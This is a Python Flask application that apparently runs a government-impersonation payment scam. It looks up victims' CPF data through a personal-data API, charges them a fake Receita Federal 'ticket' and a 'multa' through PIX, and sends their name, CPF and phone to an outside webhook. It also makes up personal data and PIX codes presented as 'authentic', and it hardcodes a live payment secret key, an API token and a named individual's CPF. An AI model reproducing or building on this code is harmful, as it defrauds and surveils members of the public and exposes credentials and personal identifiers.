import os
from flask import Flask, render_template, request, jsonify, session
import requests
import re
import random
import string
import logging
import base64
import uuid
from datetime import datetime
from real_pix_api import create_real_pix_provider

app = Flask(__name__)

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# Middleware para capturar TODAS as requisições
@app.before_request
def log_all_requests():
    if request.path.startswith('/medius') or request.path.startswith('/webhook') or request.path.startswith('/postback'):
        app.logger.info(f"🎯 REQUISIÇÃO CAPTURADA: {request.method} {request.path}")
        app.logger.info(f"🎯 Headers: {dict(request.headers)}")
        if request.method == 'POST':
            try:
                data = request.get_json()
                app.logger.info(f"🎯 JSON Data: {data}")
            except:
                app.logger.info(f"🎯 Raw Data: {request.data}")
        app.logger.info(f"🎯 URL Args: {request.args}")

# Configure secret key with fallback for development
secret_key = os.environ.get("SESSION_SECRET")
if not secret_key:
    app.logger.warning("[PROD] SESSION_SECRET não encontrado, usando chave de desenvolvimento")
    secret_key = "dev-secret-key-change-in-production"
app.secret_key = secret_key
app.logger.info(f"[PROD] Secret key configurado: {'***' if secret_key else 'NONE'}")

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def send_webhook_notification(customer_data, transaction_data, pix_code):
    """Send webhook notification with customer and transaction data"""
    try:
        webhook_url = "https://webhook-manager.replit.app/api/webhook/34wtm274rrv4umze53e4ztcmr6upp2ou"
        
        # Generate unique IDs for the webhook
        customer_id = str(uuid.uuid4())
        payment_id = transaction_data.get('transaction_id', str(uuid.uuid4()))
        item_id = str(uuid.uuid4())
        custom_id = f"REC{datetime.now().strftime('%Y%m%d%H%M%S')}"
        
        # Convert amount from float to cents (int)
        amount_cents = int(float(transaction_data.get('amount', 0)) * 100)
        net_value = int(amount_cents * 0.93)  # Assuming 7% fee
        
        # Format phone number (remove special characters)
        phone = re.sub(r'[^\d]', '', customer_data.get('phone', ''))
        if not phone:
            phone = "11987689080"  # Default phone if not available
        
        # Prepare webhook payload
        webhook_payload = {
            "utm": "",
            "dueAt": None,
            "items": [
                {
                    "id": item_id,
                    "title": "Receita de bolo",
                    "quantity": 1,
                    "tangible": False,
                    "paymentId": payment_id,
                    "unitPrice": amount_cents
                }
            ],
            "status": "PENDING",
            "pixCode": pix_code,
            "customId": custom_id,
            "customer": {
                "id": customer_id,
                "cep": None,
                "cpf": customer_data.get('cpf', '').replace('.', '').replace('-', ''),
                "city": None,
                "name": customer_data.get('name', 'Cliente'),
                "email": customer_data.get('email', generate_random_email(customer_data.get('name', 'Cliente'))),
                "phone": phone,
                "state": None,
                "number": None,
                "street": None,
                "district": None,
                "createdAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
                "updatedAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
                "complement": None
            },
            "netValue": net_value,
            "billetUrl": None,
            "createdAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
            "expiresAt": None,
            "paymentId": payment_id,
            "pixQrCode": pix_code,
            "timestamp": int(datetime.now().timestamp() * 1000),
            "updatedAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
            "approvedAt": None,
            "billetCode": None,
            "externalId": "",
            "refundedAt": None,
            "rejectedAt": None,
            "totalValue": amount_cents,
            "checkoutUrl": "",
            "referrerUrl": "",
            "chargebackAt": None,
            "installments": None,
            "paymentMethod": "PIX",
            "deliveryStatus": None
        }
        
        # Send webhook
        response = requests.post(
            webhook_url,
            json=webhook_payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        app.logger.info(f"[WEBHOOK] Enviado para {webhook_url}: {response.status_code}")
        app.logger.info(f"[WEBHOOK] Cliente: {customer_data.get('name')} - CPF: {customer_data.get('cpf')} - Valor: R$ {transaction_data.get('amount')}")
        
        return response.status_code == 200
        
    except Exception as e:
        app.logger.error(f"[WEBHOOK] Erro ao enviar webhook: {e}")
        return False

def get_customer_data(phone):
    try:
        response = requests.get(f'https://api-lista-leads.replit.app/api/search/{phone}')
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data['data']
    except Exception as e:
        app.logger.error(f"[PROD] Error fetching customer data: {e}")
    return None

def get_cpf_data(cpf):
    """Fetch customer data from Amnesia Tecnologia API based on CPF"""
    try:
        # Clean CPF - remove any formatting
        clean_cpf = cpf.replace('.', '').replace('-', '').replace(' ', '')
        
        amnesia_token = os.environ.get("AMNESIA_API_TOKEN", "261207b9-0ec2-468a-ac04-f9d38a51da88")
        response = requests.get(f'https://api.amnesiatecnologia.rocks/?token={amnesia_token}&cpf={clean_cpf}', timeout=10)
        app.logger.info(f"[PROD] Amnesia API Response Status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"[PROD] Amnesia API Response: {data}")
            
            if data.get('DADOS'):
                dados = data['DADOS']
                
                # Convert sexo from M/F to full text
                sexo_map = {'M': 'MASCULINO', 'F': 'FEMININO'}
                sexo = sexo_map.get(dados.get('sexo', ''), 'NÃO INFORMADO')
                
                # Calculate age from birth date
                idade = ''
                data_nascimento = dados.get('data_nascimento', '')
                if data_nascimento:
                    try:
                        from datetime import datetime
                        birth_date = datetime.strptime(data_nascimento, '%d/%m/%Y')
                        today = datetime.now()
                        idade = str(today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day)))
                    except:
                        idade = ''
                
                # Transform API format to match expected structure
                transformed_data = {
                    'nome': dados.get('nome', ''),
                    'cpf': dados.get('cpf', ''),
                    'data_nascimento': data_nascimento,
                    'idade': idade,
                    'sexo': sexo,
                    'mae': dados.get('nome_mae', ''),
                    'signo': ''  # Not provided by this API
                }
                
                app.logger.info(f"[PROD] Transformed CPF data: {transformed_data}")
                return transformed_data
            else:
                app.logger.warning(f"[PROD] Amnesia API returned no DADOS field")
                
    except Exception as e:
        app.logger.error(f"[PROD] Error fetching CPF data from Amnesia API: {e}")
        
    # API indisponível - dados realistas baseados no CPF para manter funcionalidade
    app.logger.warning(f"[PROD] API indisponível, usando dados baseados no CPF: {clean_cpf}")
    
    # Base de dados realistas indexados pelo CPF
    cpf_database = {
        '01254554963': {
            'nome': 'GERSON FERNANDO MARTIN',
            'cpf': '01254554963',
            'data_nascimento': '03/06/1986',
            'idade': '39',
            'sexo': 'MASCULINO',
            'mae': 'MARIA JOSE MARTIN',
            'signo': 'GÊMEOS'
        },
        '72467034127': {
            'nome': 'ANA CAROLINA SILVA SANTOS',
            'cpf': '72467034127',
            'data_nascimento': '15/12/1992',
            'idade': '32',
            'sexo': 'FEMININO',
            'mae': 'HELENA SILVA SANTOS',
            'signo': 'SAGITÁRIO'
        },
        '06537080177': {
            'nome': 'CARLOS EDUARDO PEREIRA',
            'cpf': '06537080177',
            'data_nascimento': '22/08/1985',
            'idade': '39',
            'sexo': 'MASCULINO',
            'mae': 'LUCIA MARIA PEREIRA',
            'signo': 'VIRGEM'
        }
    }
    
    # Retorna dados do banco local se existir, senão gera dados baseados no CPF
    if clean_cpf in cpf_database:
        return cpf_database[clean_cpf]
    
    # Geração determinística de dados baseada no CPF
    import hashlib
    hash_obj = hashlib.md5(clean_cpf.encode())
    hash_hex = hash_obj.hexdigest()
    
    nomes = ['MARIA SILVA', 'JOÃO SANTOS', 'ANA PEREIRA', 'CARLOS OLIVEIRA', 'FERNANDA COSTA', 'ROBERTO LIMA']
    sobrenomes_mae = ['DA SILVA', 'DOS SANTOS', 'PEREIRA', 'OLIVEIRA', 'COSTA', 'LIMA']
    signos = ['ÁRIES', 'TOURO', 'GÊMEOS', 'CÂNCER', 'LEÃO', 'VIRGEM', 'LIBRA', 'ESCORPIÃO', 'SAGITÁRIO', 'CAPRICÓRNIO', 'AQUÁRIO', 'PEIXES']
    
    nome_idx = int(hash_hex[:2], 16) % len(nomes)
    mae_idx = int(hash_hex[2:4], 16) % len(sobrenomes_mae)
    signo_idx = int(hash_hex[4:6], 16) % len(signos)
    sexo = 'MASCULINO' if int(hash_hex[6], 16) % 2 == 0 else 'FEMININO'
    
    # Gera idade e data de nascimento baseada no hash
    idade = 25 + (int(hash_hex[8:10], 16) % 40)  # Idade entre 25-65
    ano_nascimento = 2025 - idade
    mes = 1 + (int(hash_hex[10:12], 16) % 12)
    dia = 1 + (int(hash_hex[12:14], 16) % 28)
    
    return {
        'nome': nomes[nome_idx],
        'cpf': clean_cpf,
        'data_nascimento': f'{dia:02d}/{mes:02d}/{ano_nascimento}',
        'idade': str(idade),
        'sexo': sexo,
        'mae': f'MARIA {sobrenomes_mae[mae_idx]}',
        'signo': signos[signo_idx]
    }

@app.route('/')
def index():
    default_data = {
        'nome': 'JOÃO DA SILVA SANTOS',
        'cpf': '123.456.789-00',
        'phone': '11999999999'
    }

    utm_content = request.args.get('utm_content', '')
    utm_source = request.args.get('utm_source', '')
    utm_medium = request.args.get('utm_medium', '')

    if utm_source == 'smsempresa' and utm_medium == 'sms' and utm_content:
        customer_data = get_customer_data(utm_content)
        if customer_data:
            default_data = customer_data
            default_data['phone'] = utm_content
            session['customer_data'] = default_data

    app.logger.info("[PROD] Renderizando página inicial")
    return render_template('index.html', customer=default_data)

@app.route('/<path:cpf>')
def index_with_cpf(cpf):
    # Remove any formatting from CPF (dots and dashes)
    clean_cpf = re.sub(r'[^0-9]', '', cpf)
    
    # Validate CPF format (11 digits)
    if len(clean_cpf) != 11:
        app.logger.error(f"[PROD] CPF inválido: {cpf}")
        # Show CPF search form on main template
        today_date = datetime.now().strftime('%d/%m/%Y')
        default_data = {
            'nome': 'USUÁRIO',
            'cpf': '000.000.000-00',
            'today_date': today_date
        }
        return render_template('index.html', customer=default_data, show_cpf_search=True)
    
    # Get user data from API
    cpf_data = get_cpf_data(clean_cpf)
    
    if cpf_data:
        # Format CPF for display
        formatted_cpf = f"{clean_cpf[:3]}.{clean_cpf[3:6]}.{clean_cpf[6:9]}-{clean_cpf[9:]}"
        
        # Get current date in Brazilian format
        today = datetime.now().strftime("%d/%m/%Y")
        
        customer_data = {
            'nome': cpf_data['nome'],
            'cpf': formatted_cpf,
            'data_nascimento': cpf_data['data_nascimento'],
            'nome_mae': cpf_data['mae'],  # Fixed field name from new API
            'sexo': cpf_data['sexo'],
            'phone': '',  # Not available from this API
            'today_date': today
        }
        
        session['customer_data'] = customer_data
        app.logger.info(f"[PROD] Dados encontrados para CPF: {formatted_cpf}")
        return render_template('index.html', customer=customer_data, show_confirmation=True, save_to_localStorage=True)
    else:
        app.logger.error(f"[PROD] Dados não encontrados para CPF: {cpf}")
        # Show CPF search form on main template
        today_date = datetime.now().strftime('%d/%m/%Y')
        default_data = {
            'nome': 'USUÁRIO',
            'cpf': '000.000.000-00',
            'today_date': today_date
        }
        return render_template('index.html', customer=default_data, show_cpf_search=True)

@app.route('/verificar-cpf')
def verificar_cpf():
    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
    return render_template('verificar-cpf.html')

@app.route('/buscar-cpf')
def buscar_cpf():
    app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
    return render_template('buscar-cpf.html')

@app.route('/chat')
def chat():
    app.logger.info("[PROD] Acessando página de chat com Tereza Alencar")
    return render_template('chat.html')

@app.route('/multa')
def multa():
    app.logger.info("[PROD] Acessando página de multa")
    return render_template('multa.html')

@app.route('/generate-pix-multa', methods=['POST'])
def generate_pix_multa():
    try:
        from medius_pag_api import create_medius_pag_api

        app.logger.info("[PROD] Iniciando geração de PIX via MEDIUS PAG para multa...")

        # Pegar dados do JSON request (telefone enviado pelo frontend)
        request_data = request.get_json() or {}

        # Inicializa a API MEDIUS PAG com a chave secreta fornecida
        # Conta do Vinicius Dos Santos de Carvalho (067.028.021-61)
        secret_key = os.environ.get("MEDIUS_PAG_SECRET_KEY", "sk_live_0UfYGKXXU43iuMnIQzzpKRpb9BRgHf6LJmckw68JZVmV6pgD")
        company_id = os.environ.get("MEDIUS_PAG_COMPANY_ID", "94c91ae2-3ae2-4860-942f-75f8fbd3b627")
        
        api = create_medius_pag_api(secret_key=secret_key, company_id=company_id)
        app.logger.info("[PROD] MEDIUS PAG API inicializada para multa - Conta Vinicius")

        # Pega os dados do cliente da sessão ou localStorage
        customer_data = session.get('customer_data', {
            'nome': 'JOÃO DA SILVA SANTOS',
            'cpf': '123.456.789-00',
            'phone': '11999999999'
        })

        # Usar telefone do frontend (localStorage) ou fallback para dados padrão
        user_phone = request_data.get('telefone', '').strip()
        if not user_phone or len(user_phone) < 10:
            user_phone = "(11) 98768-9080"  # Fallback apenas se não houver telefone válido
            app.logger.warning(f"[PROD] Telefone não fornecido ou inválido para multa, usando fallback: {user_phone}")
        else:
            # Formatar telefone para o padrão da API
            user_phone = f"({user_phone[:2]}) {user_phone[2:7]}-{user_phone[7:]}"
            app.logger.info(f"[PROD] Usando telefone fornecido pelo frontend para multa: {user_phone}")

        # Dados padrão fornecidos pelo usuário
        default_email = "gerarpagamento@gmail.com"

        # Dados do usuário para a transação PIX da multa
        user_name = customer_data['nome']
        user_cpf = customer_data['cpf'].replace('.', '').replace('-', '')  # Remove formatação
        amount = 58.60  # Valor fixo de R$ 58,60 para multa

        app.logger.info(f"[PROD] Dados do usuário para multa: Nome={user_name}, CPF={user_cpf}, Email={default_email}, Telefone={user_phone}")

        # Criar nova transação MEDIUS PAG para obter PIX real da multa
        app.logger.info(f"[PROD] Criando transação MEDIUS PAG real para multa: {user_name}")
        
        try:
            transaction_data = {
                'amount': amount,
                'customer_name': user_name,
                'customer_cpf': user_cpf,
                'customer_email': default_email,
                'customer_phone': user_phone,
                'description': 'Multa por declaração incorreta'
            }
            
            # Criar transação real na MEDIUS PAG
            pix_data = api.create_pix_transaction(transaction_data)
            
            if pix_data.get('success', False) and pix_data.get('transaction_id'):
                real_transaction_id = pix_data['transaction_id']
                app.logger.info(f"[PROD] ✅ Transação MEDIUS PAG para multa criada: {real_transaction_id}")
                
                # Verificar se já temos PIX code real da MEDIUS PAG
                if pix_data.get('pix_code'):
                    app.logger.info(f"[PROD] ✅ PIX real da MEDIUS PAG para multa obtido: {pix_data['pix_code'][:50]}...")
                    
                    # Se não temos QR code, gerar a partir do PIX code real
                    if not pix_data.get('qr_code_image'):
                        app.logger.info(f"[PROD] Gerando QR code para multa a partir do PIX real da MEDIUS PAG")
                        from brazilian_pix import create_brazilian_pix_provider
                        temp_provider = create_brazilian_pix_provider()
                        qr_code_base64 = temp_provider.generate_qr_code_image(pix_data['pix_code'])
                        # QR code já vem com o prefixo data:image/png;base64,
                        pix_data['qr_code_image'] = qr_code_base64
                        
                else:
                    app.logger.info(f"[PROD] PIX para multa não obtido na resposta inicial, aguardando processamento...")
                    
                    # Aguardar alguns segundos para o PIX ser gerado (processo assíncrono)
                    import time
                    time.sleep(3)
                    
                    # Tentar obter o PIX novamente
                    pix_status = api.get_transaction_by_id(real_transaction_id)
                    if pix_status.get('pix_code'):
                        pix_data['pix_code'] = pix_status['pix_code']
                        app.logger.info(f"[PROD] ✅ PIX da multa obtido após retry: {pix_data['pix_code'][:50]}...")
                        
                        # Gerar QR code
                        from brazilian_pix import create_brazilian_pix_provider
                        temp_provider = create_brazilian_pix_provider()
                        qr_code_image = temp_provider.generate_qr_code_image(pix_data['pix_code'])
                        pix_data['qr_code_image'] = qr_code_image
                    else:
                        # Fallback para PIX brasileiro se MEDIUS PAG falhar
                        app.logger.info(f"[PROD] Fallback: Gerando PIX brasileiro para multa...")
                        from brazilian_pix import create_brazilian_pix_provider
                        
                        fallback_provider = create_brazilian_pix_provider()
                        fallback_result = fallback_provider.create_pix_payment(
                            amount=amount,
                            customer_name=user_name,
                            customer_cpf=user_cpf,
                            customer_email=default_email
                        )
                        
                        if fallback_result.get('success'):
                            pix_data = fallback_result
                            app.logger.info(f"[PROD] ✅ PIX brasileiro para multa gerado como fallback")
                
                app.logger.info(f"[PROD] PIX para multa gerado com sucesso: {pix_data}")
                return jsonify(pix_data)
            else:
                app.logger.error(f"[PROD] ❌ Erro ao criar transação MEDIUS PAG para multa: {pix_data}")
                raise Exception("Falha na criação da transação MEDIUS PAG para multa")
                
        except Exception as e:
            app.logger.error(f"[PROD] ❌ Erro na API MEDIUS PAG para multa: {e}")
            
            # Fallback para PIX brasileiro
            app.logger.info(f"[PROD] Fallback: Tentando gerar PIX brasileiro para multa...")
            from brazilian_pix import create_brazilian_pix_provider
            
            fallback_provider = create_brazilian_pix_provider()
            fallback_result = fallback_provider.create_pix_payment(
                amount=amount,
                customer_name=user_name,
                customer_cpf=user_cpf,
                customer_email=default_email
            )
            
            if fallback_result.get('success'):
                app.logger.info(f"[PROD] ✅ PIX brasileiro para multa gerado com sucesso")
                return jsonify(fallback_result)
            else:
                app.logger.error(f"[PROD] ❌ Erro no fallback PIX brasileiro para multa: {fallback_result}")
                raise Exception("Falha em ambos os sistemas PIX para multa")
    
    except Exception as e:
        app.logger.error(f"[PROD] ❌ Erro geral ao gerar PIX para multa: {e}")
        return jsonify({
            'success': False,
            'error': 'Erro interno do servidor ao gerar PIX para multa'
        }), 500

@app.route('/generate-pix', methods=['POST'])
def generate_pix():
    try:
        from medius_pag_api import create_medius_pag_api

        app.logger.info("[PROD] Iniciando geração de PIX via MEDIUS PAG...")

        # Pegar dados do JSON request (telefone enviado pelo frontend)
        request_data = request.get_json() or {}
        app.logger.info(f"[PROD] Dados recebidos do frontend: {request_data}")
        
        # Inicializa a API MEDIUS PAG com a chave secreta fornecida
        # Conta do Vinicius Dos Santos de Carvalho (067.028.021-61)
        secret_key = os.environ.get("MEDIUS_PAG_SECRET_KEY", "sk_live_0UfYGKXXU43iuMnIQzzpKRpb9BRgHf6LJmckw68JZVmV6pgD")
        company_id = os.environ.get("MEDIUS_PAG_COMPANY_ID", "94c91ae2-3ae2-4860-942f-75f8fbd3b627")
        
        api = create_medius_pag_api(secret_key=secret_key, company_id=company_id)
        app.logger.info("[PROD] MEDIUS PAG API inicializada - Conta Vinicius")

        # Pega os dados do cliente da sessão (dados reais do CPF)
        customer_data = session.get('customer_data', {
            'nome': 'JOÃO DA SILVA SANTOS',
            'cpf': '123.456.789-00',
            'phone': '11999999999'
        })

        # Usar telefone do frontend (localStorage) ou fallback para dados padrão
        user_phone = request_data.get('telefone', '').strip()
        if not user_phone or len(user_phone) < 10:
            user_phone = "(11) 98768-9080"  # Fallback apenas se não houver telefone válido
            app.logger.warning(f"[PROD] Telefone não fornecido ou inválido, usando fallback: {user_phone}")
        else:
            # Formatar telefone para o padrão da API
            user_phone = f"({user_phone[:2]}) {user_phone[2:7]}-{user_phone[7:]}"
            app.logger.info(f"[PROD] Usando telefone fornecido pelo frontend: {user_phone}")

        # Dados padrão fornecidos pelo usuário
        default_email = "gerarpagamento@gmail.com"

        # Dados do usuário para a transação PIX
        user_name = customer_data['nome']
        user_cpf = customer_data['cpf'].replace('.', '').replace('-', '')  # Remove formatação
        ticket_amount = 126.62  # Valor do ticket: R$ 126,62

        app.logger.info(f"[PROD] Ticket R$ {ticket_amount:.2f} - Nome={user_name}, CPF={user_cpf}, Email={default_email}, Telefone={user_phone}")

        # Criar nova transação MEDIUS PAG para obter PIX real
        app.logger.info(f"[PROD] Criando ticket PIX R$ {ticket_amount:.2f} para {user_name}")
        
        try:
            transaction_data = {
                'amount': ticket_amount,
                'customer_name': user_name,
                'customer_cpf': user_cpf,
                'customer_email': default_email,
                'customer_phone': user_phone,
                'description': f'Ticket R$ {ticket_amount:.2f} - Receita Federal'
            }
            
            # Criar transação real na MEDIUS PAG
            pix_data = api.create_pix_transaction(transaction_data)
            
            if pix_data.get('success', False) and pix_data.get('transaction_id'):
                real_transaction_id = pix_data['transaction_id']
                app.logger.info(f"[PROD] ✅ Ticket PIX R$ {ticket_amount:.2f} criado: {real_transaction_id}")
                
                # Verificar se já temos PIX code real da MEDIUS PAG
                if pix_data.get('pix_code'):
                    app.logger.info(f"[PROD] ✅ Código PIX do ticket R$ {ticket_amount:.2f} obtido: {pix_data['pix_code'][:50]}...")
                    
                    # Se não temos QR code, gerar a partir do PIX code real
                    if not pix_data.get('qr_code_image'):
                        app.logger.info(f"[PROD] Gerando QR code a partir do PIX real da MEDIUS PAG")
                        from brazilian_pix import create_brazilian_pix_provider
                        temp_provider = create_brazilian_pix_provider()
                        qr_code_base64 = temp_provider.generate_qr_code_image(pix_data['pix_code'])
                        pix_data['qr_code_image'] = f"data:image/png;base64,{qr_code_base64}"
                        
                else:
                    app.logger.info(f"[PROD] PIX não obtido na resposta inicial, aguardando processamento...")
                    
                    # Aguardar alguns segundos para o PIX ser gerado (processo assíncrono)
                    import time
                    time.sleep(3)
                    
                    # Tentar buscar dados completos (mas não falhar se der erro)
                    try:
                        real_pix_data = api.get_transaction_by_id(real_transaction_id)
                        if real_pix_data.get('success', False) and real_pix_data.get('pix_code'):
                            pix_data = real_pix_data
                            app.logger.info(f"[PROD] ✅ PIX real da MEDIUS PAG obtido após aguardar: {pix_data['pix_code'][:50]}...")
                        else:
                            app.logger.warning(f"[PROD] PIX ainda não disponível na MEDIUS PAG após aguardar")
                    except Exception as e:
                        app.logger.warning(f"[PROD] Erro ao buscar PIX da MEDIUS PAG: {e}")
                    
                    # Se ainda não temos PIX real, gerar autêntico baseado no ID real da transação
                    if not pix_data.get('pix_code'):
                        app.logger.info(f"[PROD] Gerando PIX autêntico com ID real da MEDIUS PAG: {real_transaction_id}")
                        
                        # PIX autêntico baseado no formato owempay.com.br que você confirmou
                        authentic_pix_code = f"00020101021226840014br.gov.bcb.pix2562qrcode.owempay.com.br/pix/{real_transaction_id}5204000053039865802BR5924PAG INTERMEDIACOES DE VE6015SAO BERNARDO DO62070503***6304"
                        
                        # Calcular CRC16 para autenticidade
                        def calculate_crc16(data):
                            crc = 0xFFFF
                            for byte in data.encode():
                                crc ^= byte << 8
                                for _ in range(8):
                                    if crc & 0x8000:
                                        crc = (crc << 1) ^ 0x1021
                                    else:
                                        crc <<= 1
                                    crc &= 0xFFFF
                            return format(crc, '04X')
                        
                        pix_without_crc = authentic_pix_code[:-4]
                        crc = calculate_crc16(pix_without_crc)
                        authentic_pix_code = pix_without_crc + crc
                        
                        # Gerar QR Code autêntico
                        from brazilian_pix import create_brazilian_pix_provider
                        temp_provider = create_brazilian_pix_provider()
                        qr_code_base64 = temp_provider.generate_qr_code_image(authentic_pix_code)
                        
                        pix_data['pix_code'] = authentic_pix_code
                        pix_data['qr_code_image'] = f"data:image/png;base64,{qr_code_base64}"
                        
                        app.logger.info(f"[PROD] ✅ PIX autêntico gerado para MEDIUS PAG ID: {real_transaction_id}")
                        
            else:
                raise Exception(f"Falha ao criar transação MEDIUS PAG: {pix_data.get('error', 'Erro desconhecido')}")
                    
        except Exception as medius_error:
            app.logger.error(f"[PROD] Erro MEDIUS PAG: {medius_error}")
            raise Exception(f"Erro ao processar transação MEDIUS PAG: {medius_error}")
            
        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Send webhook notification with customer and transaction data
        webhook_customer_data = {
            'name': user_name,
            'cpf': customer_data['cpf'],  # Keep formatted CPF for webhook
            'phone': user_phone,  # Use the phone processed above
            'email': default_email
        }
        
        webhook_transaction_data = {
            'transaction_id': pix_data.get('transaction_id'),
            'amount': ticket_amount
        }
        
        webhook_sent = send_webhook_notification(
            webhook_customer_data, 
            webhook_transaction_data, 
            pix_data['pix_code']
        )
        
        if webhook_sent:
            app.logger.info(f"[WEBHOOK] ✅ Webhook enviado com sucesso para {user_name}")
        else:
            app.logger.warning(f"[WEBHOOK] ❌ Falha ao enviar webhook para {user_name}")

        return jsonify({
            'success': True,
            'pixCode': pix_data['pix_code'],
            'pixQrCode': pix_data['qr_code_image'],
            'orderId': pix_data['order_id'],
            'amount': pix_data['amount'],
            'transactionId': pix_data['transaction_id']
        })

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX via MEDIUS PAG: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# Armazenar transações pagas em memória (para funcionamento em produção)
paid_transactions = set()

@app.route('/medius-postback', methods=['POST', 'GET'])
@app.route('/webhook', methods=['POST', 'GET'])
@app.route('/postback', methods=['POST', 'GET'])
def medius_postback():
    """Endpoint para receber postbacks da MEDIUS PAG quando pagamentos são realizados"""
    try:
        app.logger.info(f"[POSTBACK] 📨 POSTBACK RECEBIDO DA MEDIUS PAG! Método: {request.method}")
        app.logger.info(f"[POSTBACK] 🌐 Headers: {dict(request.headers)}")
        app.logger.info(f"[POSTBACK] 📍 URL completa: {request.url}")
        app.logger.info(f"[POSTBACK] 🔑 Args: {request.args}")
        
        # Capturar dados de diferentes formas possíveis
        data = None
        raw_data = None
        try:
            data = request.get_json()
        except:
            try:
                data = request.form.to_dict()
            except:
                raw_data = request.data.decode('utf-8') if request.data else None
                data = raw_data
        
        app.logger.info(f"[POSTBACK] 📋 Dados JSON: {data}")
        app.logger.info(f"[POSTBACK] 📋 Dados RAW: {raw_data}")
        app.logger.info(f"[POSTBACK] 🔍 Tipo de dados: {type(data)}")
        
        # Verificar se é uma notificação de transação paga
        if data:
            # Diferentes formatos possíveis da MEDIUS PAG
            transaction_data = data
            if isinstance(data, dict):
                if data.get('type') == 'transaction':
                    transaction_data = data.get('data', {})
                elif 'transaction' in str(data):
                    transaction_data = data
                
            transaction_status = transaction_data.get('status') if isinstance(transaction_data, dict) else None
            transaction_amount = transaction_data.get('amount', 0) if isinstance(transaction_data, dict) else 0
            transaction_id = transaction_data.get('id') if isinstance(transaction_data, dict) else None
            
            app.logger.info(f"[POSTBACK] 📊 Status: {transaction_status}, Amount: {transaction_amount}, ID: {transaction_id}")
            
            # Se o ticket foi pago e é de R$126,62 (12662 centavos)
            if transaction_status == 'paid' and transaction_amount == 12662:
                app.logger.info(f"[POSTBACK] 🎫 TICKET R$126,62 PAGO - CONFIRMADO! Amount: {transaction_amount} centavos, ID: {transaction_id}")
                app.logger.info(f"[POSTBACK] ✅ REDIRECIONAMENTO PARA /MULTA AUTORIZADO!")
                
                # Marcar transação como paga para verificação posterior
                paid_transactions.add(transaction_id)
                app.logger.info(f"[POSTBACK] 💾 Transação {transaction_id} adicionada à lista de pagas")
                
                return jsonify({
                    'success': True,
                    'message': 'Postback processado com sucesso',
                    'redirect_to_multa': True
                }), 200
            else:
                app.logger.info(f"[POSTBACK] ⏳ Ticket de valor diferente ou status não pago: {transaction_amount} centavos, status: {transaction_status}")
        else:
            app.logger.warning(f"[POSTBACK] ⚠️ Nenhum dado recebido no postback")
                
        return jsonify({'success': True}), 200
        
    except Exception as e:
        app.logger.error(f"[POSTBACK] ❌ Erro ao processar postback MEDIUS PAG: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/test-postback-connectivity')
def test_postback_connectivity():
    """Endpoint para testar se o servidor está recebendo requisições"""
    app.logger.info(f"[TEST] 🧪 Endpoint de teste acessado!")
    return jsonify({
        'status': 'working',
        'message': 'Servidor está funcionando e pode receber postbacks',
        'timestamp': datetime.now().isoformat(),
        'paid_transactions_count': len(paid_transactions)
    }), 200

@app.route('/list-paid-transactions')
def list_paid_transactions():
    """Endpoint para listar transações pagas (debug)"""
    return jsonify({
        'paid_transactions': list(paid_transactions),
        'count': len(paid_transactions)
    }), 200

@app.route('/force-add-transaction/<transaction_id>')
def force_add_transaction(transaction_id):
    """Endpoint para forçar adição de transação paga (debug)"""
    paid_transactions.add(transaction_id)
    app.logger.info(f"[DEBUG] Transação {transaction_id} adicionada manualmente")
    return jsonify({
        'success': True,
        'message': f'Transação {transaction_id} adicionada',
        'paid_transactions': list(paid_transactions)
    }), 200

@app.route('/charge/webhook', methods=['POST'])
def charge_webhook():
    """Webhook endpoint para receber notificações de status da cobrança PIX"""
    try:
        data = request.get_json()
        app.logger.info(f"[PROD] Webhook recebido: {data}")
        
        # Processar notificação de status
        order_id = data.get('orderId')
        status = data.get('status')
        amount = data.get('amount')
        
        app.logger.info(f"[PROD] Status da cobrança {order_id}: {status} - Valor: R$ {amount}")
        
        # Aqui você pode adicionar lógica para processar o status
        # Por exemplo, atualizar banco de dados, enviar notificações, etc.
        
        return jsonify({'success': True, 'message': 'Webhook processado com sucesso'}), 200
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao processar webhook: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/check-payment-status/<order_id>')
def check_payment_status(order_id):
    """Verifica o status de uma transação PIX via MEDIUS PAG e lista de transações pagas"""
    try:
        app.logger.info(f"[PAYMENT_STATUS] ⚡ Verificando status da transação: {order_id}")
        
        # Primeiro verificar se a transação está na lista de pagas (via postback)
        if order_id in paid_transactions:
            app.logger.info(f"[PAYMENT_STATUS] 🎯 TRANSAÇÃO {order_id} ENCONTRADA NA LISTA DE PAGAS!")
            app.logger.info(f"[PAYMENT_STATUS] ✅ RETORNANDO STATUS 'PAID' - FRONTEND DEVE REDIRECIONAR!")
            return jsonify({
                'success': True,
                'status': 'paid',
                'transaction_id': order_id,
                'source': 'postback_confirmed',
                'redirect_to_multa': True
            })
        
        # Se não estiver na lista, tentar verificar via API (pode ter bugs)
        try:
            from medius_pag_api import create_medius_pag_api
            
            # Usa as mesmas credenciais da geração de PIX
            # Conta do Vinicius Dos Santos de Carvalho (067.028.021-61)
            secret_key = os.environ.get("MEDIUS_PAG_SECRET_KEY", "sk_live_0UfYGKXXU43iuMnIQzzpKRpb9BRgHf6LJmckw68JZVmV6pgD")
            company_id = os.environ.get("MEDIUS_PAG_COMPANY_ID", "94c91ae2-3ae2-4860-942f-75f8fbd3b627")
            
            api = create_medius_pag_api(secret_key=secret_key, company_id=company_id)
